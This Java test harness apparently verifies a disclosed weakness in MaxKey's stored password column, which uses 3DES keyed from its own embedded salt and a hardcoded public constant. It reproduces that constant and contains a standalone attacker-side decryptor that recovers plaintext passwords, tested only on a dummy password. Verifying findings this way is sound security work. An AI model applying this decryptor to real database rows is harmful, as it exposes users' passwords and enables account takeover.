/*
 * Harness B — decipherable column key inversion
 *
 * Finding under test:
 *   maxkey-20261002-decipherable-selfkeyed-desede
 *
 * Claim under test: mxk_userinfo.DECIPHERABLE is not a one-way hash. It is
 * PasswordReciprocal.encode(plaintext), a DESede (3DES) ciphertext whose key is derived
 * from data carried INSIDE the stored value itself plus a hardcoded constant that ships in
 * the public source:
 *
 *   ReciprocalUtils.java:49  private static final String defaultKey = "l0JqT7NvIzP9oRaG4kFc1QmD_bWu3x8E5yS2h6";
 *
 * Key derivation actually performed by the code (verified by reading it):
 *   PasswordReciprocal.encode(plain):
 *       salt      = BCrypt.gensalt("$2a", 10)        // 29 chars, random
 *       keyInput  = salt.substring(7)                // 22 chars, embedded in the output
 *       stored    = salt + ReciprocalUtils.encode2Hex(keyInput + plain, keyInput)
 *   ReciprocalUtils.encode2Hex(simple, secretKey):
 *       key       = generatorDefaultKey(secretKey + defaultKey, "DESede")
 *   generatorDefaultKey(k, "DESede"):
 *       k         = k + defaultKey                  // appended a SECOND time
 *       key       = k.substring(0, 24)              // truncated to 24 bytes
 *   So: key = salt[7..29] (22 chars) + defaultKey[0..2] (2 chars) = exactly 24 bytes.
 *   Everything needed to decrypt is therefore: the stored column value + the public constant.
 *
 * WHY THIS HARNESS IS NOT CIRCULAR:
 * The strongest part of this harness is section 3, which performs the decryption with a
 * SEPARATE, INDEPENDENTLY WRITTEN implementation using raw javax.crypto — it does NOT call
 * MaxKey's decoder(). If MaxKey's own code were self-consistent but wrong, section 3 would
 * still fail. Section 3 proves a third party holding only the DB column and the source code
 * can recover the plaintext password.
 *
 * SCOPE LIMIT (stated honestly):
 * This harness proves the CRYPTOGRAPHIC WEAKNESS. It does not prove that any particular
 * live database contains an exploitable row, nor that a given deployment writes the column.
 * The write path is a separate source fact:
 *   maxkey-persistence/.../service/impl/UserInfoServiceImpl.java:209
 *       changePassword.setDecipherable(PasswordReciprocal.getInstance().encode(changePassword.getPassword()));
 *   maxkey-webs/.../controller/RegisterController.java:114
 *       userInfo.setDecipherable(PasswordReciprocal.getInstance().encode(password));
 *   and the server itself decrypts it at maxkey-protocol-authorize/.../AuthorizeBaseEndpoint.java:96
 *       PasswordReciprocal.getInstance().decoder(userInfo.getDecipherable())
 *
 * DUMMY DATA ONLY. The password used below is the throwaway string "DummyPassw0rd!".
 */

import java.nio.charset.StandardCharsets;
import java.util.Arrays;


import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

import org.dromara.maxkey.crypto.password.PasswordReciprocal;

public final class DecipherableKeyInversionProbe {

    private static int failures = 0;
    private static int checks = 0;

    /** Dummy password. Not a real credential. */
    private static final String DUMMY_PASSWORD = "DummyPassw0rd!";

    /**
     * Copied VERBATIM from ReciprocalUtils.java:49. It is a private static final field in
     * the product source and is therefore available to anyone who has read the source.
     */
    private static final String PUBLIC_DEFAULT_KEY = "l0JqT7NvIzP9oRaG4kFc1QmD_bWu3x8E5yS2h6";

    private static final int PREFFIX_LENGTH = 7;   // PasswordReciprocal.PREFFIX_LENGTH
    private static final int SALT_LENGTH = 29;     // BCrypt.gensalt("$2a", 10).length()

    public static void main(String[] args) {
        System.out.println("=========================================================================");
        System.out.println(" Harness B - decipherable column key inversion");
        System.out.println(" finding  : maxkey-20261002-decipherable-selfkeyed-desede");
        System.out.println("=========================================================================");
        System.out.println();
        System.out.println("[INFO] public constant from ReciprocalUtils.java:49 = \"" + PUBLIC_DEFAULT_KEY + "\"");
        System.out.println("[INFO] dummy password used                      = \"" + DUMMY_PASSWORD + "\"");
        System.out.println();

        PasswordReciprocal enc = PasswordReciprocal.getInstance();

        // =====================================================================
        // SECTION 1 — round trip through MaxKey's own implementation.
        // =====================================================================
        System.out.println("--- SECTION 1: encode/decoder round trip (MaxKey's own code) ---");
        String stored1 = enc.encode(DUMMY_PASSWORD);
        System.out.println("[INFO] stored column value = " + stored1);
        System.out.println("[INFO]   length            = " + stored1.length()
                + "  (salt 29 chars + hex ciphertext)");
        String recovered1 = enc.decoder(stored1);
        System.out.println("[INFO] decoder(stored)     = \"" + recovered1 + "\"");
        check("ASSERTION 1  encode() then decoder() recovers the plaintext",
                DUMMY_PASSWORD.equals(recovered1));
        check("ASSERTION 2  the stored value does NOT contain the plaintext verbatim",
                !stored1.contains(DUMMY_PASSWORD));

        // =====================================================================
        // SECTION 2 — the derived key is salt[7..29] + publicKey[0..2], 24 bytes.
        // =====================================================================
        System.out.println();
        System.out.println("--- SECTION 2: key derivation from the stored value alone ---");
        String salt = stored1.substring(0, SALT_LENGTH);
        
        String expectedKey = (salt.substring(PREFFIX_LENGTH) + PUBLIC_DEFAULT_KEY).substring(0, 24);

        System.out.println("[INFO] salt (first 29 chars)              = " + salt);
        System.out.println("[INFO] salt.substring(7) (embedded key)   = " + salt.substring(PREFFIX_LENGTH));
        System.out.println("[INFO] publicKey[0..2]                    = \"" + PUBLIC_DEFAULT_KEY.substring(0, 2) + "\"");
        System.out.println("[INFO] derived 3DES key (24 bytes)        = " + expectedKey);
        check("ASSERTION 3  derived key is exactly 24 bytes (DESede requirement)",
                expectedKey.length() == 24);
        check("ASSERTION 4  derived key == salt[7..29] + publicConstant[0..2]",
                expectedKey.equals(salt.substring(PREFFIX_LENGTH)
                        + PUBLIC_DEFAULT_KEY.substring(0, 24 - (SALT_LENGTH - PREFFIX_LENGTH))));

        // =====================================================================
        // SECTION 3 — INDEPENDENT decryption using only the stored string.
        // This block does NOT call any MaxKey code. It is a from-scratch attacker's
        // implementation using raw javax.crypto.
        // =====================================================================
        System.out.println();
        System.out.println("--- SECTION 3: INDEPENDENT decryption (raw javax.crypto, no MaxKey code) ---");
        System.out.println("[INFO] inputs available to an attacker:");
        System.out.println("[INFO]   (a) the DB column value  : " + stored1);
        System.out.println("[INFO]   (b) the public constant  : \"" + PUBLIC_DEFAULT_KEY + "\"");
        String attackerRecovered = independentDecrypt(stored1, PUBLIC_DEFAULT_KEY);
        System.out.println("[INFO] recovered plaintext     = \"" + attackerRecovered + "\"");
        check("ASSERTION 5  an independent 3DES decryptor recovers the plaintext from the column value + public constant",
                DUMMY_PASSWORD.equals(attackerRecovered));

        // Show that only the column value is required at decode time: feed a value that was
        // produced by a DIFFERENT encode() call and decrypt it with no other state.
        System.out.println();
        System.out.println("--- SECTION 4: random salt, both stored values decrypt ---");
        String stored2 = enc.encode(DUMMY_PASSWORD);
        String stored3 = enc.encode(DUMMY_PASSWORD);
        System.out.println("[INFO] stored1 = " + stored1);
        System.out.println("[INFO] stored2 = " + stored2);
        System.out.println("[INFO] stored3 = " + stored3);
        check("ASSERTION 6  three encode() calls on the same plaintext yield three different stored values (random salt)",
                !stored1.equals(stored2) && !stored2.equals(stored3) && !stored1.equals(stored3));
        check("ASSERTION 7  all three decode correctly (MaxKey decoder)",
                DUMMY_PASSWORD.equals(enc.decoder(stored1))
                        && DUMMY_PASSWORD.equals(enc.decoder(stored2))
                        && DUMMY_PASSWORD.equals(enc.decoder(stored3)));
        check("ASSERTION 8  all three decode correctly (independent decryptor)",
                DUMMY_PASSWORD.equals(independentDecrypt(stored1, PUBLIC_DEFAULT_KEY))
                        && DUMMY_PASSWORD.equals(independentDecrypt(stored2, PUBLIC_DEFAULT_KEY))
                        && DUMMY_PASSWORD.equals(independentDecrypt(stored3, PUBLIC_DEFAULT_KEY)));

        // =====================================================================
        // SECTION 5 — the key is NOT derived from any server-side secret.
        // An attacker who does NOT know the constant cannot decrypt, which is precisely
        // why the constant being in public source is what makes this a finding.
        // =====================================================================
        System.out.println();
        System.out.println("--- SECTION 5: what is and is not required to decrypt ---");
        String wrongKeyGuess = salt.substring(PREFFIX_LENGTH) + "ZZ";
        String wrongResult = independentDecryptWithKey(stored1, wrongKeyGuess);
        System.out.println("[INFO] decrypt with a wrong 2-char guess -> \"" + wrongResult + "\"");
        check("ASSERTION 9  a wrong trailing 2 chars yields garbage, so the constant is the only unknown",
                !DUMMY_PASSWORD.equals(wrongResult));
        System.out.println("[INFO] the trailing 2 chars are the FIRST 2 CHARACTERS of a constant that is");
        System.out.println("[INFO] published in the open-source repository, so they are not a secret at all.");

        System.out.println();
        System.out.println("-------------------------------------------------------------------------");
        System.out.printf(" checks run: %d, failures: %d%n", checks, failures);
        System.out.println(failures == 0 ? " RESULT: PASS" : " RESULT: FAIL");
        System.out.println("-------------------------------------------------------------------------");
        System.exit(failures == 0 ? 0 : 1);
    }

    /**
     * From-scratch attacker-side decryption. Uses ONLY the stored column value and the
     * public constant. No MaxKey class is referenced here.
     */
    private static String independentDecrypt(String storedValue, String publicDefaultKey) {
        String salt = storedValue.substring(0, SALT_LENGTH);
        // Same derivation the product performs: (salt[7..29] + defaultKey + defaultKey)[0..24)
        // which collapses to salt[7..29] (22 chars) + defaultKey[0..2] (2 chars).
        String key24 = (salt.substring(PREFFIX_LENGTH) + publicDefaultKey).substring(0, 24);
        return independentDecryptWithKey(storedValue, key24);
    }

    /**
     * The ciphertext is HEX-encoded by ReciprocalUtils.encode2Hex, not Base64.
     * hexDecode() is written here from scratch so this block stays independent of MaxKey code.
     */
    private static byte[] hexDecode(String hex) {
        byte[] out = new byte[hex.length() / 2];
        for (int i = 0; i < out.length; i++) {
            out[i] = (byte) Integer.parseInt(hex.substring(i * 2, i * 2 + 2), 16);
        }
        return out;
    }

    private static String independentDecryptWithKey(String storedValue, String key24) {
        try {
            String salt = storedValue.substring(0, SALT_LENGTH);
            String ciphertextHex = storedValue.substring(SALT_LENGTH);
            byte[] cipherBytes = hexDecode(ciphertextHex);

            SecretKeySpec keySpec = new SecretKeySpec(key24.getBytes(StandardCharsets.UTF_8), "DESede");
            Cipher cipher = Cipher.getInstance("DESede");
            cipher.init(Cipher.DECRYPT_MODE, keySpec);
            byte[] plain = cipher.doFinal(cipherBytes);

            // The plaintext begins with the embedded key material itself; strip it, exactly
            // as PasswordReciprocal.decoder does.
            String decoded = new String(plain, StandardCharsets.UTF_8);
            return decoded.substring(salt.substring(PREFFIX_LENGTH).length());
        } catch (Exception e) {
            return "<decryption failed: " + e.getClass().getSimpleName() + ">";
        }
    }

    private static void check(String label, boolean condition) {
        checks++;
        if (!condition) {
            failures++;
        }
        System.out.println((condition ? "PASS  " : "FAIL  ") + label);
    }
}
